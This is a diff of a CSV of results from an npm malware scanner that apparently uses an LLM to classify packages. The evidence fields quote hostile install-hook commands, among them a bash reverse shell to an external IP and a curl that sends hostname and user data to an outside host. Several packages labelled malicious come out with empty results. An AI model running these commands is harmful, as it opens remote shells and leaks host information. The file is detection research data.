@@ -1,5 +1,5 @@
-package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json
-@aaakca/myf,1.0.14,malicious,2026-03-26T13:32:41.568604,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+package_name,version,label,timestamp,routing,structural_risk_score,parse_success,total_behaviors,behavior_categories,max_confidence,model_name,prompt_version,raw_response,parsed_json,analyst_note
+@aaakca/myf,1.0.14,malicious,2026-03-26T14:42:47.385494,review,0.336,True,2,install_hook;suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
@@ -27,20 +27,16 @@ package_name,version,label,timestamp,routing,structural_risk_score,parse_success
   ],
   ""risk_vector"": [""install_hook"", ""suspicious_behavior""]
 }
-```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata."", ""details"": ""The install hook commands are: pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt"", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt""], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package file structure does not contain any JavaScript files."", ""confidence"": 0.34, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}"
-@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-26T13:32:42.919849,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [{""category"": ""install_hook"", ""summary"": ""The package contains an install hook present in the payload that may execute at install time via the commands listed in the package metadata."", ""details"": ""The install hook commands are: pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt"", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""pwd>/tmp/asda;sh../../../public/uploads/1.sh>../../../public/result.txt""], ""evidence_env_vars"": []}, {""category"": ""suspicious_behavior"", ""summary"": ""Package contains no JavaScript files."", ""details"": ""The package file structure does not contain any JavaScript files."", ""confidence"": 0.34, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""install_hook"", ""suspicious_behavior""]}",
+@alfalab/core-components,37.3.0-beta.10,malicious,2026-03-26T14:42:48.725735,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
 ```
 
-```","{""behaviors"": [], ""risk_vector"": []}"
-@anemone95/evil,1.0.9,malicious,2026-03-26T13:32:44.307647,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json{""behaviors"":[],""risk_vector"":[]}```
-
-
-I'm sorry, but I can't assist with that.","{""behaviors"": [], ""risk_vector"": []}"
-@arkadium/eagle-user-client,9.1.1,malicious,2026-03-26T13:32:54.125353,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@arkadium/eagle-user-client,9.1.1,malicious,2026-03-26T14:43:00.138324,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
@@ -59,14 +55,14 @@ I'm sorry, but I can't assist with that.","{""behaviors"": [], ""risk_vector"": 
 }
 ```
 
-This analysis indicates that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the file './.pbk.js'. The domain 'dc.70.lc' is also a sign of potential network exfiltration.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a specific host."", ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""./.pbk.js""], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}"
-@arkadium/eagle-user-client,9.99.999,malicious,2026-03-26T13:33:03.973529,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+This analysis indicates that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the file './.pbk.js'. The domain 'dc.70.lc' is also a sign of potential network exfiltration.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a specific host."", ""details"": ""The code is making network requests to 'dc.70.lc' on port 443."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""./.pbk.js""], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a specific host, potentially for data exfiltration. The confidence score is 0.78, indicating a high level of confidence in the detection of this behavior. The evidence for this behavior comes from the use of the 'https.request' API in the file './.pbk.js'. The domain 'dc.70.lc' is also a sign of potential network exfiltration."
+@arkadium/eagle-user-client,9.99.999,malicious,2026-03-26T14:43:10.884197,review,0.494,True,1,network_exfiltration,0.71,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
       ""category"": ""network_exfiltration"",
       ""summary"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443."",
-      ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. TFhe request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."",
+      ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."",
       ""confidence"": 0.71,
       ""evidence_apis"": [],
       ""evidence_files"": [],
@@ -79,8 +75,8 @@ This analysis indicates that the code is making network requests to a specific h
 }
 ```
 
-This analysis indicates that the code is making network requests to a remote host, potentially for data exfiltration. The risk score is 0.71, indicating a high level of confidence that this behavior is malicious. The evidence for this behavior comes from the network request to 'dc.70.lc' on port 443.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443."", ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."", ""confidence"": 0.71, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}"
-@aszxc/npmexp,1.0.1,malicious,2026-03-26T13:33:11.920240,flag,1.0,True,1,backdoor_installation,0.9,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+This analysis indicates that the code is making network requests to a remote host, potentially for data exfiltration. The risk score is 0.71, indicating a high level of confidence that this behavior is malicious. The evidence for this behavior comes from the network request to 'dc.70.lc' on port 443.","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443."", ""details"": ""The code is making network requests to a hostname 'dc.70.lc' on port 443. The request method is 'POST' and the path is '/d'. The request body contains the IP address, hostname, and directory path of the current process."", ""confidence"": 0.71, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [""dc.70.lc""], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}","that the code is making network requests to a remote host, potentially for data exfiltration. The risk score is 0.71, indicating a high level of confidence that this behavior is malicious. The evidence for this behavior comes from the network request to 'dc.70.lc' on port 443."
+@aszxc/npmexp,1.0.1,malicious,2026-03-26T14:43:18.967336,flag,1.0,True,1,backdoor_installation,0.9,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
@@ -99,34 +95,16 @@ This analysis indicates that the code is making network requests to a remote hos
 }
 ```
 
-```","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."", ""details"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."", ""confidence"": 0.9, ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/39.96.12.202/222220>&1'""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""backdoor_installation""]}"
-@att-bit/duc.components.cardshell,10.0.0,malicious,2026-03-26T13:33:18.585445,flag,0.7773,False,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"Based on the provided information, the primary signal is ""Known webhook/exfiltration collector domain in install hook"". This signal suggests that there might be a data exfiltration intent. However, without the actual source code or API calls, it's hard to confirm this. 
-
-
-The code snippet provided in the entry point (main) is:
-
-```javascript
-module.exports.hacked=function(){
-  return ""ICHPackageTest""
-}
-```
-
-This code exports a function that returns a string ""ICHPackageTest"". It doesn't seem to contain any API calls, files, or commands that could indicate a malicious intent. 
-
-The risk vector is set to ""data_exfiltration"". 
-
-The confidence score is 0.83, which is high. 
-
-Please provide the actual source code or API calls for a more accurate analysis.",{}
-@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-26T13:33:19.914019,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [{""category"": ""backdoor_installation"", ""summary"": ""The package contains a backdoor installation signal in the pre-install hook."", ""details"": ""The package contains a backdoor installation signal in the pre-install hook. The backdoor installation signal is a reverse shell that connects to an external IP address (39.96.12.202) on port 22222."", ""confidence"": 0.9, ""evidence_commands"": [""bash-c'bash-i>&/dev/tcp/39.96.12.202/222220>&1'""], ""evidence_files"": [], ""evidence_apis"": [], ""evidence_domains"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""backdoor_installation""]}",
+@att-bit/duc.components.cardshell,10.0.1,malicious,2026-03-26T14:43:26.993273,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
 ```
 
-```","{""behaviors"": [], ""risk_vector"": []}"
-@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-26T13:33:27.079324,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@att-bit/duc.components.cardshell,10.0.2,malicious,2026-03-26T14:43:33.823721,review,0.364,True,1,network_exfiltration,0.78,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
@@ -145,8 +123,8 @@ Please provide the actual source code or API calls for a more accurate analysis.
 }
 ```
 
-```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to a hostname derived from the process arguments and the hostname of the machine."", ""details"": ""The code sends a POST request to a hostname derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""test.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}"
-@b2bgeo/yav,13.3.8,malicious,2026-03-26T13:33:40.224618,review,0.336,True,1,suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [{""category"": ""network_exfiltration"", ""summary"": ""The code sends network requests to a hostname derived from the process arguments and the hostname of the machine."", ""details"": ""The code sends a POST request to a hostname derived from the process arguments and the hostname of the machine. The payload contains the hostname and a project ID from the process arguments."", ""confidence"": 0.78, ""evidence_apis"": [""https.request""], ""evidence_files"": [""test.js""], ""evidence_domains"": [], ""evidence_commands"": [], ""evidence_env_vars"": []}], ""risk_vector"": [""network_exfiltration""]}",
+@b2bgeo/yav,13.3.8,malicious,2026-03-26T14:43:46.885090,review,0.336,True,1,suspicious_behavior,0.72,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [
     {
@@ -165,38 +143,38 @@ Please provide the actual source code or API calls for a more accurate analysis.
 }
 ```
 
-This JSON object represents the analysis of the package @b2bgeo/yav version 13.3.8. The behavior category is ""suspicious_behavior"", with a summary and details about the behavior. The confidence level of the behavior is 0.72. The evidence commands indicate a potential payload that may be remote. The risk vector includes the ""suspicious_behavior"" category.","{""behaviors"": [{""category"": ""suspicious_behavior"", ""summary"": ""The package contains no JavaScript files and an install hook present."", ""details"": ""The package file structure indicates the presence of an install hook that may execute at install time. The commands listed in the package metadata indicate a potential payload that may be remote."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl-H\""Package:@b2bgeo/yav\""-H\""Version:13.3.8\""-H\""Hostname:$(hostname|base64)\"""", ""-H\""Whoami:$(whoami|base64)\"""", ""-H\""Pwd:$(pwd|base64)\"""", ""-d\""meow!securitytest\""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""suspicious_behavior""]}"
-@actions/core,1.10.1,benign,2026-03-26T13:33:41.567389,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json{""behaviors"":[],""risk_vector"":[]}```
+This JSON object represents the analysis of the package @b2bgeo/yav version 13.3.8. The behavior category is ""suspicious_behavior"", with a summary and details about the behavior. The confidence level of the behavior is 0.72. The evidence commands indicate a potential payload that may be remote. The risk vector includes the ""suspicious_behavior"" category.","{""behaviors"": [{""category"": ""suspicious_behavior"", ""summary"": ""The package contains no JavaScript files and an install hook present."", ""details"": ""The package file structure indicates the presence of an install hook that may execute at install time. The commands listed in the package metadata indicate a potential payload that may be remote."", ""confidence"": 0.72, ""evidence_apis"": [], ""evidence_files"": [], ""evidence_domains"": [], ""evidence_commands"": [""curl-H\""Package:@b2bgeo/yav\""-H\""Version:13.3.8\""-H\""Hostname:$(hostname|base64)\"""", ""-H\""Whoami:$(whoami|base64)\"""", ""-H\""Pwd:$(pwd|base64)\"""", ""-d\""meow!securitytest\""http://npm-org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru""], ""evidence_env_vars"": []}], ""risk_vector"": [""suspicious_behavior""]}","This JSON object represents the analysis of the package @b2bgeo/yav version 13.3.8. The behavior category is ""suspicious_behavior"", with a summary and details about the behavior. The confidence level of the behavior is 0.72. The evidence commands indicate a potential payload that may be remote. The risk vector includes the ""suspicious_behavior"" category."
+@actions/core,1.10.1,benign,2026-03-26T14:43:48.182971,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json{""behaviors"":[],""risk_vector"":[]}```
 
 
-```","{""behaviors"": [], ""risk_vector"": []}"
-@alifd/next,1.26.24,benign,2026-03-26T13:33:43.030361,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@alifd/next,1.26.24,benign,2026-03-26T14:43:49.513395,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
 ```
 
-```","{""behaviors"": [], ""risk_vector"": []}"
-@ampproject/remapping,2.2.1,benign,2026-03-26T13:33:44.600270,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@ampproject/remapping,2.2.1,benign,2026-03-26T14:43:51.049406,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
-@angular-devkit/core,16.2.3,benign,2026-03-26T13:33:46.296337,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@angular-devkit/core,16.2.3,benign,2026-03-26T14:43:52.676833,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
-@ant-design/icons,5.2.6,benign,2026-03-26T13:33:47.646000,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@ant-design/icons,5.2.6,benign,2026-03-26T14:43:54.019259,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
-@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-26T13:33:58.161135,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"Based on the provided JavaScript code, it appears that the package is primarily focused on parsing JSON schema files and resolving references within them. However, there are no evident malicious behaviors or suspicious patterns in the code.
+```","{""behaviors"": [], ""risk_vector"": []}",
+@apidevtools/json-schema-ref-parser,11.1.0,benign,2026-03-26T14:44:04.368420,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"Based on the provided JavaScript code, it appears that the package is primarily focused on parsing JSON schema files and resolving references within them. However, there are no evident malicious behaviors or suspicious patterns in the code.
 
 
 ## Static Analysis
@@ -218,30 +196,30 @@ The output of the analysis is a JSON object with an empty ""behaviors"" array an
 }
 ```
 
-Please note that this analysis is based on the provided code and does not guarantee the safety of the package. For a comprehensive security analysis, it is recommended to conduct a full code review and possibly conduct a dynamic analysis.","{""behaviors"": [], ""risk_vector"": []}"
-@apollo/client,3.8.4,benign,2026-03-26T13:33:59.674742,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+Please note that this analysis is based on the provided code and does not guarantee the safety of the package. For a comprehensive security analysis, it is recommended to conduct a full code review and possibly conduct a dynamic analysis.","{""behaviors"": [], ""risk_vector"": []}","that this analysis is based on the provided code and does not guarantee the safety of the package. For a comprehensive security analysis, it is recommended to conduct a full code review and possibly conduct a dynamic analysis."
+@apollo/client,3.8.4,benign,2026-03-26T14:44:05.732308,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
 ```
 
-```","{""behaviors"": [], ""risk_vector"": []}"
-@assemblyscript/loader,0.27.9,benign,2026-03-26T13:34:01.220197,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@assemblyscript/loader,0.27.9,benign,2026-03-26T14:44:07.264129,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
-@aws-cdk/aws-ec2,1.204.0,benign,2026-03-26T13:34:03.033895,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@aws-cdk/aws-ec2,1.204.0,benign,2026-03-26T14:44:09.026708,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
-@azure/abort-controller,1.1.0,benign,2026-03-26T13:34:04.481998,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v1.0,"```json
+```","{""behaviors"": [], ""risk_vector"": []}",
+@azure/abort-controller,1.1.0,benign,2026-03-26T14:44:10.473171,skip,0.0,True,0,,0,deepseek-coder-6.7b-instruct,semantic_v2.0,"```json
 {
   ""behaviors"": [],
   ""risk_vector"": []
 }
-```","{""behaviors"": [], ""risk_vector"": []}"
+```","{""behaviors"": [], ""risk_vector"": []}",
